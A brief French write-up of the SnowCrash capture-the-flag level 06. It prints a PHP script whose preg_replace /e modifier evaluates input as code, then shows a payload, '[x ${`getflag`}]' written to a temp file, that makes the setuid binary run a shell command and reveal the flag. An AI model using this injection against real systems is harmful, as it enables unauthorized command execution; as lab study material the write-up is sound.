# Level 06

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Une fois qu'on execute l'executable level06 on obtient cette erreur
```bash
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

Une fois qu'on lit le contenue du fichier .php on voit juste apres 'file_get_contents' la fonction 'preg_replace' possede un '/e' qui permet de transformer la chaine de caractere contenu dedans [x 'cmd'] en code PHP execute
```php
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Il nous suffit juste d'inserer la commande qu'on souhaite injecter dans le code php et voir le resultat
```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/rce
level06@SnowCrash:~$ ./level06 /tmp/rce
PHP Notice:  Undefined variable: Check flag.Here is your token : **************
 in /home/user/level06/level06.php(4) : regexp code on line 1
```